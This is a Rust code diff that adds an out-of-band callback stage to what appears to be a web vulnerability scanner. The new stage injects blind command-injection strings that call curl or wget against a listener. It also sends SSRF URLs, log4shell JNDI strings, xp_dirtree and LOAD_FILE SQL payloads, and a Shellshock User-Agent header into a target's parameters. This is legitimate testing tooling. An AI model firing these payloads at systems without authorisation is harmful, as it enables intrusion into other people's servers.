@@ -384,6 +384,118 @@ pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
         scan_stats.insert("header_injection".into(), stats);
     }
 
+    // ── BLIND / OUT-OF-BAND (the killer chain) ───────────────────────────────
+    // Auto-starts the OAST HTTP listener, injects blind SQLi / cmdi / SSRF /
+    // log4shell payloads per parameter, then waits for callbacks. Every hit
+    // becomes a critical finding because OAST callbacks are unambiguous.
+    let with_oast = params["with_oast"].as_bool().unwrap_or(scan_all);
+    if with_oast {
+        let mut stats = ScanTypeStats::default();
+        let oast_port = params["oast_port"].as_u64().unwrap_or(8888) as u16;
+        match crate::oast::ensure_http_listener(oast_port).await {
+            Err(e) => {
+                eprintln!("[active_scan] OAST listener failed: {} — skipping OOB checks", e);
+            }
+            Ok(port) => {
+                let host = crate::oast::callback_host();
+                let server_domain = format!("{}:{}", host, port);
+                let baseline_len = crate::oast::get_interactions().lock().await.len();
+
+                let mut payload_map: HashMap<String, (String, String)> = HashMap::new();
+
+                // Payload templates take (callback_url, callback_host_port).
+                // callback_url = http://<host>:<port>/<correlation_id> (path-correlated)
+                // callback_host_port = <host>:<port> (for ldap://, nslookup, etc.)
+                let kinds: &[(&str, fn(&str, &str) -> Vec<String>)] = &[
+                    ("blind_cmdi", |cb_url, _hp| {
+                        vec![
+                            format!("; curl {} #", cb_url),
+                            format!("| curl {} ", cb_url),
+                            format!("`curl {}`", cb_url),
+                            format!("$(curl {})", cb_url),
+                            format!("; wget {} -O /dev/null #", cb_url),
+                        ]
+                    }),
+                    ("blind_ssrf", |cb_url, _hp| {
+                        vec![cb_url.to_string(), cb_url.replace("http://", "https://")]
+                    }),
+                    ("log4shell", |_cb_url, hp| {
+                        vec![format!("${{jndi:ldap://{}/x}}", hp), format!("${{jndi:dns://{}/x}}", hp)]
+                    }),
+                    ("blind_sqli_dns", |_cb_url, hp| {
+                        // UNC-path-style — only works if the target's DB can resolve `hp`
+                        // (so DNS-based WS_OAST_HOST, not IP). Harmless on IP targets.
+                        vec![
+                            format!("' UNION SELECT LOAD_FILE('//{}/a')-- ", hp),
+                            format!("'; EXEC xp_dirtree '//{}/'-- ", hp),
+                        ]
+                    }),
+                ];
+
+                for (param_name, _) in &params_list {
+                    for (kind, mk_payloads) in kinds {
+                        let p = crate::oast::generate_oast_payload(
+                            &format!("active_scan {} on {}", kind, param_name),
+                            &server_domain,
+                        );
+                        payload_map
+                            .insert(p.correlation_id.clone(), (param_name.clone(), (*kind).to_string()));
+                        for injection in mk_payloads(&p.callback_url, &server_domain) {
+                            stats.requests += 1;
+                            let url = replace_param(target, param_name, &injection);
+                            let _ = client.get(&url).send().await;
+                        }
+                    }
+                }
+
+                // Shellshock probe (User-Agent header carrier).
+                let shellshock_p = crate::oast::generate_oast_payload("shellshock probe", &server_domain);
+                payload_map
+                    .insert(shellshock_p.correlation_id.clone(), ("User-Agent".into(), "shellshock".into()));
+                let ua = format!("() {{ :; }}; /usr/bin/curl {}", shellshock_p.callback_url);
+                let _ = client.get(target).header("User-Agent", ua).send().await;
+                stats.requests += 1;
+
+                let wait_ms = params["oast_wait_ms"].as_u64().unwrap_or(15000);
+                tokio::time::sleep(std::time::Duration::from_millis(wait_ms)).await;
+
+                let log = crate::oast::get_interactions().lock().await;
+                for interaction in log.iter().skip(baseline_len) {
+                    if let Some((param, kind)) = payload_map.get(&interaction.correlation_id) {
+                        stats.findings += 1;
+                        all_findings.push(Finding {
+                            id: next_finding_id(),
+                            finding_type: kind.clone(),
+                            name: format!("OAST callback — {} on parameter '{}'", kind, param),
+                            severity: "critical".into(),
+                            confidence: "certain".into(),
+                            url: target.into(),
+                            parameter: Some(param.clone()),
+                            payload: Some(format!(
+                                "correlation_id={} interaction_id={}",
+                                interaction.correlation_id, interaction.id
+                            )),
+                            evidence: format!(
+                                "{} callback from {} at {}",
+                                interaction.interaction_type, interaction.source_ip, interaction.timestamp
+                            ),
+                            detail: format!(
+                                "An OAST payload for parameter '{}' caused the target to make an out-of-band {} request to our listener. High-confidence proof of {} — input processed in a way that triggered external connections.",
+                                param, interaction.interaction_type, kind
+                            ),
+                            remediation: format!(
+                                "Validate and sanitize input for parameter '{}'. Restrict outbound network access from the application server.",
+                                param
+                            ),
+                            request_info: None,
+                        });
+                    }
+                }
+            }
+        }
+        scan_stats.insert("blind_oast".into(), stats);
+    }
+
     let total_requests: usize = scan_stats.values().map(|s| s.requests).sum();
     let total_findings = all_findings.len();
 
